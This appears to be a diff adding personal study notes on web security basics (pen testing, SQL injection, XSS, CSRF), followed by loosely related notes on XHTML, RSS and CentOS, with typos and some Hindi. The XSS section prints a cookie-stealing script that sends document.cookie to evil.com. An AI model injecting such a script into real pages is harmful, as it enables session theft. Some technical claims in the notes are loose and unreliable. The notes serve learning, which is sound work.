@@ -1,0 +1,68 @@
+
+OWASP : The Open Web Application Security Project
+
+############################Website Hacks############################
+
+Hacking : Hacking is identifying weakness in computer systems or networks to exploit its weaknesses to gain access. Example of Hacking: Using password cracking algorithm to gain access to a system
+
+Penetration Testing :
+	•A penetration test, also known as a pen test, is a simulated cyber attack against your computer system to check for exploitable vulnerabilities.
+	•Phases
+		•Planning: Target/Website analysis to get more inof about it like DNS, IP etc.
+		•Scanning: Either Static scanning or dynamic scanning
+		•Gain Access: Attack on target using XSS, SQL Injection , CRFR etc.
+		•Maintain Accessa dn Analysis shared.
+
+Type of hacker:
+	•White, Black (illegal), Red, 
+	Blue-Blue hat hackers are the security professionals who can check the loop holes, vulnerabilities and errors in the softwares before the company launched it. Blue hat hackers are the security professionals who are outside the organizations. Most of the companies invite them to check the vulnerabilities in their softwares before the launching event. Blue hat hackers work are same like white hat hackers. Blue hat hackers word are famous due to Microsoft. Microsoft team think this wonderful idea of invite the hackers outside the organization to check their softwares before launching event. Therefore, blue hat hackers are also called Blue Hat Microsoft Hackers.
+	,Gray hat hacker,
+	, Script Kiddies (A non-skilled person who gains access to computer systems using already made tools)
+	
+SQL Injection:
+	•A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. 
+	•Use Prepared stmt and sanitize user input.
+	
+Blind SQL Injection :
+
+	•Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible. 
+	
+Cross site Scripting
+	•XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
+	•adding  <script>
+	window.location="http://evil.com/?cookie=" + document.cookie
+	</script>
+	•To prevent use scannig tool , and sanitize your htmls, Set the HttpOnly flag.
+	Cookie Stealing can be done by Cross site scripting
+
+NMap tool can make in use for port scanning.
+
+CSRF(Corss site request Forgery)
+	•Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated
+	•Eg , it involves Social enginnering where a hacker need to force the target to click on particular link to order to get the access to target website.
+	•Microsoft refers to this type of attack as a One-Click attack 
+	•To mitigate it : anti-forgery token (stored with cookies)made into use that needs to validated by the server for evry request.
+
+**********************************
+XHTML is the stricter ,more XML based version of HTML.
+Here <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">  is MANDATORY
+<html xmlns="http://www.w3.org/1999/xhtml"> Namespace os manadtory.
+
+
+•HTML DOM
+	•The Document Object Model (DOM) is the data representation of the objects that comprise the structure and content of a document on the web. 
+	•It creates a tree like documnet sturcutre to porcess it.
+
+Really Simple Syndication(RSS feeds)
+
+	•RSS is a protocol that provides an open method of syndicating and aggregating web content.
+	•To user , uskoo RSS feed apne browser main subscribe karna hoga, which will be feeded up whenever any changes made public through wrSS feed of subscribred websites.
+	•Outdated technology but still popular in few website.
+
+•CENTOS is free version whille RHEL(Red hat enterprise linux) is paid.
+But Centos can provide more or less same fetaures of RHEL but their enterprise support.
+
+
+•Because SQL does not use variables and control-of-flow statements, it is often used as a database sublanguage that can be added to a program written in a conventional programming language, such as C or COBOL
+This is called as Embedded SQL. It is advantageous with Small database and tables, for high performamce, and Extensive SQL support  
